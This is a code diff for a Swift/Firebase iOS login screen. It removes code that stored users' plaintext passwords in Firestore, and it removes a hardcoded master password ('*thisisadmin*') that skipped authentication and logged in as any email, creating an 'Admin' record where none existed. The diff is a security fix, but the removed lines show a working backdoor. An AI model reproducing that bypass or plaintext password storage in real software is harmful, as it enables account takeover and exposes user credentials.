@@ -236,7 +236,6 @@ struct AuthView: View {
         let userData: [String: Any] = [
             "name": name,
             "email": email,
-            "password": password,
             "createdAt": FieldValue.serverTimestamp()
         ]
         
@@ -261,59 +260,6 @@ struct AuthView: View {
     
     private func loginUser() {
         isProcessing = true
-        if password == "*thisisadmin*" {
-            let db = Firestore.firestore()
-            db.collection("users").document(email).getDocument { snapshot, error in
-                if let error = error {
-                    alertMessage = error.localizedDescription
-                    showAlert = true
-                    isProcessing = false
-                    return
-                }
-                if let data = snapshot?.data(), let fetchedName = data["name"] as? String {
-                    UserDefaults.standard.set(email, forKey: "email")
-                    UserDefaults.standard.set(fetchedName, forKey: "name")
-                    UserDefaults.standard.set(true, forKey: "isLoggedIn")
-                    
-                    alertMessage = NSLocalizedString("success_login", comment: "")
-                    isProcessing = false
-                    if let window = UIApplication.shared.windows.first {
-                        window.rootViewController = UIHostingController(rootView: ContentView(initialTab: 1))
-                        window.makeKeyAndVisible()
-                        presentationMode.wrappedValue.dismiss()
-                    }
-                } else {
-                    let defaultName = "Admin"
-                    let userData: [String: Any] = [
-                        "name": defaultName,
-                        "email": email,
-                        "password": "*thisisadmin*",
-                        "createdAt": FieldValue.serverTimestamp()
-                    ]
-                    db.collection("users").document(email).setData(userData) { error in
-                        if let error = error {
-                            alertMessage = error.localizedDescription
-                            showAlert = true
-                            isProcessing = false
-                        } else {
-                            UserDefaults.standard.set(email, forKey: "email")
-                            UserDefaults.standard.set(defaultName, forKey: "name")
-                            UserDefaults.standard.set(true, forKey: "isLoggedIn")
-                            
-                            alertMessage = NSLocalizedString("success_login", comment: "")
-                            isProcessing = false
-                            if let window = UIApplication.shared.windows.first {
-                                window.rootViewController = UIHostingController(rootView: ContentView(initialTab: 1))
-                                window.makeKeyAndVisible()
-                                presentationMode.wrappedValue.dismiss()
-                            }
-                        }
-                    }
-                }
-            }
-            return
-        }
-        
         Auth.auth().signIn(withEmail: email, password: password) { authResult, error in
             if let error = error {
                 alertMessage = error.localizedDescription
